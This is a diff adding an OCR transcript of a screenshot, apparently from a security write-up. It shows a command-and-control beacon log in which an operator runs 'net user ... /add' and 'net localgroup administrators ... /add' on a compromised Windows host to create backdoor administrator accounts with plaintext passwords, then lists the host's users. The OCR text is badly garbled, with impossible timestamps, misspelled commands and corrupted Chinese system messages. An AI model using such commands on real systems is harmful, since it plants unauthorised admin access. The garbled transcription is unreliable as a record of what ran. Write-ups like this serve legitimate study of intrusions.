@@ -1,0 +1,28 @@
+# OCR: f6c481f635e0700acc8e939294c8c214.jpg
+# 来源: .\02-WriteUp\2024\f6c481f635e0700acc8e939294c8c214.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:46
+
+05/22 87:49:27 UTC [task] <T1859> Tasked beacon to run: net user wafer 。admtund238、/add && net localgroup administrator wafe
+rv fadd
+05/22 07:49:27 UTC [checkin] host called home, sent: 113 bytes
+05/22 07-49-27 UTC [output]
+recetyed output=
+佐 令 成 加 定 成 。
+发 生 系 统 错 误 1376。
+挺 定 的 本 地 组 不 存 在
+95/22 87:58:16 UTC [task] <T1@59> Tasked beacon to run: net user leon leon@i23. /add && net localgroup administrators leons /add
+85/22 07-58-16 UTC [checkin] host called home, sent: 104 bytes
+05/22 07-58-16 UTC [output]
+received output:
+Me RITE.
+俞 令 成 加 完 成 。
+05/22 67:58:25 UTC [unpat] <neo> shell net users
+05/22 07:50:25 UTC [task] <T1059> Tasked beacon to run: net users
+5/22 67-50-25 UTC [checkin] host called hone, sent: 40 bytes
+05/22 07:58:25 UTC [output]
+received output-
+\\INDEXUSER 的 用 户 帐 户
+Administrator Guest wafer
+D
+俞 令 成 功 宏 成 。
